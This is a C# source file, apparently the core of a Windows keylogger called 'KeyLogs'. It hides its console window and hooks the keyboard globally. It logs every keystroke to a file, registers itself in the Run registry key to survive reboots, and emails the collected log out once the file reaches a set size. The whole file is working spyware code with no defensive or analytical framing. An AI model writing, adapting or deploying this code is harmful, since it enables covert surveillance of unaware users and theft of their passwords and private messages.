using System;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace KeyLogs
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Main(string[] args)
        {
            Setup();

            GlobalHook hook = new GlobalHook(); //Commence keyboard hook
            hook.StartHook();

            hook.UnHook(); //Won't be called until after due to Application.Run() in GlobalHook.cs
        }

        static void Setup()
        {
            Console.Title = "Keylogs";

            var handle = GetConsoleWindow();
            ShowWindow(handle, 0); //Minimize window

            InfectRegistry();
        }

        public static void CaptureKey(string keyCatched)
        {
            RecordKey(keyCatched); //Writing key to file
        }

        static void TranslateKey(KeyFilter filter) //Keys here are not perfect, check for shift
        {
            string fullPath = @".\Record\Log.txt";

            StreamWriter writeSpecial = new StreamWriter(fullPath, true);

            switch (filter.GetKeyType())
            {
                case KeyFilter.SpecialKeys.Backspace:
                    writeSpecial.Write("[Backspace]");
                    break;

                case KeyFilter.SpecialKeys.Caps:
                    writeSpecial.Write("[CAPS]");
                    break;

                case KeyFilter.SpecialKeys.Enter:
                    writeSpecial.WriteLine();
                    break;

                case KeyFilter.SpecialKeys.Escape:
                    writeSpecial.Write("[Escape]");
                    break;

                case KeyFilter.SpecialKeys.Insert:
                    writeSpecial.Write("[Insert]");
                    break;

                case KeyFilter.SpecialKeys.Shift:
                    writeSpecial.Write("[Shift]");
                    break;

                case KeyFilter.SpecialKeys.Space:
                    writeSpecial.Write(" ");
                    break;

                case KeyFilter.SpecialKeys.Tab:
                    writeSpecial.Write("    ");
                    break;

                case KeyFilter.SpecialKeys.Tilde:
                    writeSpecial.Write("~");
                    break;

                case KeyFilter.SpecialKeys.Control:
                    writeSpecial.Write("[Control]");
                    break;

                case KeyFilter.SpecialKeys.Plus:
                    writeSpecial.Write("+");
                    break;

                case KeyFilter.SpecialKeys.Minus:
                    writeSpecial.Write("-");
                    break;

                case KeyFilter.SpecialKeys.LBracket:
                    writeSpecial.Write("[");
                    break;

                case KeyFilter.SpecialKeys.RBracket:
                    writeSpecial.Write("]");
                    break;

                case KeyFilter.SpecialKeys.Slash:
                    writeSpecial.Write("\\");
                    break;

                case KeyFilter.SpecialKeys.Question:
                    writeSpecial.Write("?");
                    break;

                case KeyFilter.SpecialKeys.Colon:
                    writeSpecial.Write(":");
                    break;

                case KeyFilter.SpecialKeys.Apost:
                    writeSpecial.Write("'");
                    break;
            }

            writeSpecial.Close();
        }

        static void RecordKey(string keyPressed)
        {
            string fullPath = @".\Record\Log.txt";

            if (!Directory.Exists(@".\Record") || !File.Exists(@".\Record\Log.txt")) //Check for txt file or the folder 
            {
                Directory.CreateDirectory(@".\Record"); //Create the both
                File.Create(@".\Record\Log.txt").Close();
            }

            KeyFilter filter = new KeyFilter(keyPressed);

            if(filter.GetKeyType() != KeyFilter.SpecialKeys.None)
            {
                TranslateKey(filter); //Translate keys not ready for immediate transcription
            }
            else
            {
                StreamWriter writeKey = new StreamWriter(fullPath, true);

                writeKey.Write(keyPressed);

                writeKey.Close();
            }


            FileInfo checkSize = new FileInfo(fullPath);

            if(checkSize.Length >= 1000) //Once file reaches adequate size send email
            {
                MailSender.SendMail("email@gmail.com", "password123"); //These are fake details you would have to change this
                File.WriteAllText(".\\Record\\Log.txt", string.Empty);
            }
        }

        static void InfectRegistry()
        {
            RegistryKey regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (regKey.GetValue("KeyLogs") != null) //If it already exist in startup Exist
            {
                return;
            }
            else
            {
                regKey.SetValue("KeyLogs", Application.ExecutablePath);
            }
        }
    }
}